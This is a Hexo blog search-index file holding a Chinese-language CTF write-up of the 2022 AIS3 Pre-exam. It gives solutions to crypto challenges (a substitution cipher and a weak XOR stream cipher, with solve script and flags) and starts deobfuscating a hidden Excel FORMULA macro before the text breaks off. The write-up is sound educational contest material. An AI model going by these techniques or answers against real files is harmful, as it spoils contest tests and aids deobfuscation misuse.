<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022 AIS3 Pre-exam write-up</title>
      <link href="/2022/05/16/2022-AIS3-Pre-exam-write-up/"/>
      <url>/2022/05/16/2022-AIS3-Pre-exam-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><table><thead><tr><th>ID</th><th>gunjyo</th></tr></thead><tbody><tr><td>Date</td><td>2022/05/14 10:30 - 2022/05/16 17:00</td></tr><tr><td>Rank</td><td>43(正取 AIS3)</td></tr><tr><td>Score</td><td>1970</td></tr></tbody></table><p><img src="https://i.imgur.com/yx4oDWJ.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h3><div class="spoiler collapsed">    <div class="spoiler-title">        cipher.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">shuffle</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> list<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> x<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        pt <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>f<span class="token string">"{file}.enc"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pt<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span>charset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsshuffled <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>shuffle<span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">)</span>T <span class="token operator">=</span> str<span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> shuffled<span class="token punctuation">)</span>encrypt<span class="token punctuation">(</span>T<span class="token punctuation">,</span> <span class="token string">"flag.txt"</span><span class="token punctuation">)</span>encrypt<span class="token punctuation">(</span>T<span class="token punctuation">,</span> __file__<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""Substitution cipherFrom Wikipedia, the free encyclopediaJump to navigationJump to searchThis article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Substitution cipher" – news · newspapers · books · scholar · JSTOR (March 2009) (Learn how and when to remove this template message)In cryptography, a substitution cipher is a method of encrypting in which units of plaintext are replaced with the ciphertext, in a defined manner, with the help of a key; the "units" may be single letters (the most common), pairs of letters, triplets of letters, mixtures of the above, and so forth. The receiver deciphers the text by performing the inverse substitution process to extract the original message.Substitution ciphers can be compared with transposition ciphers. In a transposition cipher, the units of the plaintext are rearranged in a different and usually quite complex order, but the units themselves are left unchanged. By contrast, in a substitution cipher, the units of the plaintext are retained in the same sequence in the ciphertext, but the units themselves are altered.There are a number of different types of substitution cipher. If the cipher operates on single letters, it is termed a simple substitution cipher; a cipher that operates on larger groups of letters is termed polygraphic. A monoalphabetic cipher uses fixed substitution over the entire message, whereas a polyalphabetic cipher uses a number of substitutions at different positions in the message, where a unit from the plaintext is mapped to one of several possibilities in the ciphertext and vice versa.Contents1    Simple substitution1.1    Security for simple substitution ciphers2    Nomenclator3    Homophonic substitution4    Polyalphabetic substitution5    Polygraphic substitution6    Mechanical substitution ciphers7    The one-time pad8    Substitution in modern cryptography9    Substitution ciphers in popular culture10    See also11    References12    External links"""</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        cipher.py.enc    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python">DXPpi6 I6iDwTDXPpi6 icwkpXksq Iz2qqns<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token number">8</span> <span class="token operator">=</span> nDI6<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    icwkpX<span class="token punctuation">.</span>Iz2qqns<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    is62iw <span class="token number">8</span>ksq swOijP6<span class="token punctuation">(</span>B<span class="token punctuation">,</span> qDns<span class="token punctuation">)</span><span class="token punctuation">:</span>    FD6z pPsw<span class="token punctuation">(</span>qDns<span class="token punctuation">)</span> cI q<span class="token punctuation">:</span>        P6 <span class="token operator">=</span> q<span class="token punctuation">.</span>isck<span class="token punctuation">(</span><span class="token punctuation">)</span>    FD6z pPsw<span class="token punctuation">(</span>q<span class="token string">"{qDns}.swO"</span><span class="token punctuation">,</span> <span class="token string">"F"</span><span class="token punctuation">)</span> cI q<span class="token punctuation">:</span>        q<span class="token punctuation">.</span>FiD6s<span class="token punctuation">(</span>P6<span class="token punctuation">.</span>6icwInc6s<span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">)</span>OzciIs6 <span class="token operator">=</span> I6iDwT<span class="token punctuation">.</span>cIODD_npFsiOcIs <span class="token operator">+</span> I6iDwT<span class="token punctuation">.</span>cIODD_2PPsiOcIs <span class="token operator">+</span> I6iDwT<span class="token punctuation">.</span>kDTD6IIz2qqnsk <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>fpDw<span class="token punctuation">(</span>Iz2qqns<span class="token punctuation">(</span>OzciIs6<span class="token punctuation">)</span><span class="token punctuation">)</span>B <span class="token operator">=</span> I6i<span class="token punctuation">.</span>Xcas6icwI<span class="token punctuation">(</span>OzciIs6<span class="token punctuation">,</span> Iz2qqnsk<span class="token punctuation">)</span>swOijP6<span class="token punctuation">(</span>B<span class="token punctuation">,</span> <span class="token string">"qncT.686"</span><span class="token punctuation">)</span>swOijP6<span class="token punctuation">(</span>B<span class="token punctuation">,</span> __qDns__<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""v24I6D626Dpw ODPzsi0ipX SDaDPskDc, 6zs qiss swOjOnpPskDcg2XP 6p wcCDTc6Dpwg2XP 6p IsciOzBzDI ci6DOns wsskI ckkD6Dpwcn OD6c6DpwI qpi CsiDqDOc6Dpw. RnscIs zsnP DXPipCs 6zDI ci6DOns 4j ckkDwT OD6c6DpwI 6p isnDc4ns Ip2iOsI. EwIp2iOsk Xc6siDcn Xcj 4s OzcnnswTsk cwk isXpCsk.0Dwk Ip2iOsI: "v24I6D626Dpw ODPzsi" – wsFI · wsFIPcPsiI · 4ppaI · IOzpnci · gvB79 (hciOz GVVY) (usciw zpF cwk Fzsw 6p isXpCs 6zDI 6sXPnc6s XsIIcTs)xw OijP6pTicPzj, c I24I6D626Dpw ODPzsi DI c Xs6zpk pq swOijP6DwT Dw FzDOz 2wD6I pq PncDw6s86 cis isPncOsk FD6z 6zs ODPzsi6s86, Dw c ksqDwsk Xcwwsi, FD6z 6zs zsnP pq c asj; 6zs "2wD6I" Xcj 4s IDwTns ns66siI (6zs XpI6 OpXXpw), PcDiI pq ns66siI, 6iDPns6I pq ns66siI, XD862isI pq 6zs c4pCs, cwk Ip qpi6z. Bzs isOsDCsi ksODPzsiI 6zs 6s86 4j PsiqpiXDwT 6zs DwCsiIs I24I6D626Dpw PipOsII 6p s86icO6 6zs piDTDwcn XsIIcTs.v24I6D626Dpw ODPzsiI Ocw 4s OpXPcisk FD6z 6icwIPpID6Dpw ODPzsiI. xw c 6icwIPpID6Dpw ODPzsi, 6zs 2wD6I pq 6zs PncDw6s86 cis isciicwTsk Dw c kDqqsisw6 cwk 2I2cnnj 12D6s OpXPns8 piksi, 426 6zs 2wD6I 6zsXIsnCsI cis nsq6 2wOzcwTsk. Qj Opw6icI6, Dw c I24I6D626Dpw ODPzsi, 6zs 2wD6I pq 6zs PncDw6s86 cis is6cDwsk Dw 6zs IcXs Is12swOs Dw 6zs ODPzsi6s86, 426 6zs 2wD6I 6zsXIsnCsI cis cn6sisk.Bzsis cis c w2X4si pq kDqqsisw6 6jPsI pq I24I6D626Dpw ODPzsi. xq 6zs ODPzsi pPsic6sI pw IDwTns ns66siI, D6 DI 6siXsk c IDXPns I24I6D626Dpw ODPzsi; c ODPzsi 6zc6 pPsic6sI pw nciTsi Tip2PI pq ns66siI DI 6siXsk PpnjTicPzDO. 5 XpwpcnPzc4s6DO ODPzsi 2IsI qD8sk I24I6D626Dpw pCsi 6zs sw6Dis XsIIcTs, FzsiscI c PpnjcnPzc4s6DO ODPzsi 2IsI c w2X4si pq I24I6D626DpwI c6 kDqqsisw6 PpID6DpwI Dw 6zs XsIIcTs, Fzsis c 2wD6 qipX 6zs PncDw6s86 DI XcPPsk 6p pws pq IsCsicn PpIID4DnD6DsI Dw 6zs ODPzsi6s86 cwk CDOs CsiIc.3pw6sw6IW    vDXPns I24I6D626DpwW.W    vsO2iD6j qpi IDXPns I24I6D626Dpw ODPzsiIG    ypXswOnc6piJ    ApXpPzpwDO I24I6D626Dpwm    RpnjcnPzc4s6DO I24I6D626Dpwt    RpnjTicPzDO I24I6D626DpwK    hsOzcwDOcn I24I6D626Dpw ODPzsiIM    Bzs pws-6DXs PckU    v24I6D626Dpw Dw Xpksiw OijP6pTicPzjY    v24I6D626Dpw ODPzsiI Dw PpP2nci O2n62isWV    vss cnIpWW    9sqsiswOsIWG    Z86siwcn nDwaI"""</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        flag.txt.enc    </div>    <div class="spoiler-content">        <p><code>5xvJ{IVnCDwT_I24t6W626DVw_ODPzJi_FDMz_awVFw_PWmDw6J86_m66cOa}</code></p>    </div></div><p>打開 Cipher.py 可以很明顯看到是 Substitution cipher，所以只要把 <code>flag.txt.enc</code> 內的字拿去比對 <code>cipher.py.enc</code> 的位置，再對應到 <code>cipher.py</code> 就可以拿到 flag 了(善用 ctrl+F)<br>Flag <code>AIS3{s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack}</code></p><h3 id="Fast-Cipher"><a href="#Fast-Cipher" class="headerlink" title="Fast Cipher"></a>Fast Cipher</h3><div class="spoiler collapsed">    <div class="spoiler-title">        cipher.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> randbelowM <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># this is a *fast* function</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token number">4</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0x48763</span>    <span class="token punctuation">)</span> <span class="token operator">%</span> M<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    ct <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> pt<span class="token punctuation">:</span>        ct<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c <span class="token operator">^</span> <span class="token punctuation">(</span>key <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        key <span class="token operator">=</span> f<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">return</span> bytes<span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> randbelow<span class="token punctuation">(</span>M<span class="token punctuation">)</span>    ct <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ct<span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        output.txt    </div>    <div class="spoiler-content">        <p><code>6c0ec840f88d4cd7fcc6d5c6d1dafcc1cad7d0fcc2d1c6fcd6d0c6c7fccfcccfde</code></p>    </div></div><p><img src="https://i.imgur.com/sBvvZNf.png"><br>由於我們知道 flag 格式，我們可以從 <code>'A'</code> 推回 key<br>接著把 key 照 <code>encrypt()</code> 去跑前五位，能發現可以推得 <code>AIS3{</code><br>因此只要跑完全部的 output 就能得到 flag 了</p><p>sol.py</p><pre class=" language-python"><code class="language-python">M <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span><span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token number">4</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0x48763</span>    <span class="token punctuation">)</span> <span class="token operator">%</span> Moutput <span class="token operator">=</span> <span class="token string">'6c0ec840f88d4cd7fcc6d5c6d1dafcc1cad7d0fcc2d1c6fcd6d0c6c7fccfcccfde'</span>output <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>output<span class="token punctuation">)</span> fm <span class="token operator">=</span> <span class="token string">'AIS3{'</span> <span class="token comment" spellcheck="true"># format</span>key <span class="token operator">=</span> <span class="token punctuation">(</span>ord<span class="token punctuation">(</span>fm<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> output<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key='</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 45</span><span class="token keyword">for</span> i <span class="token keyword">in</span> output<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token punctuation">(</span>key <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> f<span class="token punctuation">(</span>key<span class="token punctuation">)</span></code></pre><p>Flag <code>AIS3{not_every_bits_are_used_lol}</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a>Excel</h3><p>下載後在 Excel 內打開，首先取消隱藏所有工作表</p><p>在 <code>isFki</code> 可以看到一個方程式，上面標明了許多工作表裡面的儲存格，猜測是把那些儲存格內的東西接在一起<br><img src="https://i.imgur.com/xOo0RQU.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span>FORMULA<span class="token punctuation">(</span>mqLen<span class="token operator">!</span>D14<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA10<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>S17<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Q19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>L19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F3<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G26<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>O23<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P3<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>K12<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C11<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N3<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>E4<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D11<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>T5<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>K10<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA14<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>W1<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U13<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V9<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>C12<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J4<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>Y19<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K19<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F2<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K10<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z15<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>N21<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>N1<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>S2<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X2<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>D16<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>U26<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>R1<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V9<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>R11<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X1<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D5<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z19<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA4<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z9<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G7<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>U10<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U11<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G18<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>V1<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>O26<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>G5<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>H22<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P10<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>W17<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F8<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>L15<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>H3<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U17<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>BA11<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X12<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>F14<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B10<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V12<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U12<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P14<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Y1<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>B10<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F16<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q26<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>P25<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M3<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I26<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>L15<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>V25<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>G2<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I18<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>M4<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C7<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>N5<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>J9<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>I7<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G13<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>M12<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>X2<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>M1<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>P3<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>S12<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U10<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D16<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P17<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I5<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W24<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E10<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>B8<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>C14<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Z15<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA11<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>F19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z2<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>D13<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O2<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>D19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>K19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>U20<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q9<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>I17<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X17<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>Q24<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q4<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N21<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>W11<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>E17<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>H19<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>X6<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N26<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N18<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Q17<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>J25<span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>Z16<span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>P13<span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z21<span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>C24<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>X19<span class="token operator">&amp;</span>Mment<span class="token operator">!</span>O21, A137<span class="token punctuation">)</span></code></pre><p>在 Microsoft 的文章(<a href="https://support.microsoft.com/zh-tw/office/%E5%B0%87%E5%85%A9%E5%80%8B%E6%88%96%E5%A4%9A%E5%80%8B%E5%84%B2%E5%AD%98%E6%A0%BC%E5%85%A7%E7%9A%84%E6%96%87%E5%AD%97%E5%90%88%E4%BD%B5%E8%87%B3%E4%B8%80%E5%80%8B%E5%84%B2%E5%AD%98%E6%A0%BC-81ba0946-ce78-42ed-b3c3-21340eb164a6">將兩個或多個儲存格內的文字合併至一個儲存格</a>) 中可以看到合併文字的方法 : 利用 <code>&amp;" "&amp;</code>連接儲存格位置(善用搜尋取代)</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span>mqLen<span class="token operator">!</span>D14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>BA10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>S17<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Q19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>L19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>F3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>G26<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>O23<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>P3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>K12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>C11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>N3<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>E4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>D11<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>T5<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>K10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>BA14<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>W1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>U13<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>V9<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>C12<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>KRnsl<span class="token operator">!</span>J4<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>Y19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K19<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>JVHco<span class="token operator">!</span>F2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>K10<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>Z15<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>mqLen<span class="token operator">!</span>N21<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>N1<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>S2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token operator">!</span>X2<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>Mment<span class="token operator">!</span>D16<span class="token operator">&amp;</span><span class="token string">" "</span><span class="token operator">&amp;</span>coCGA<span class="token 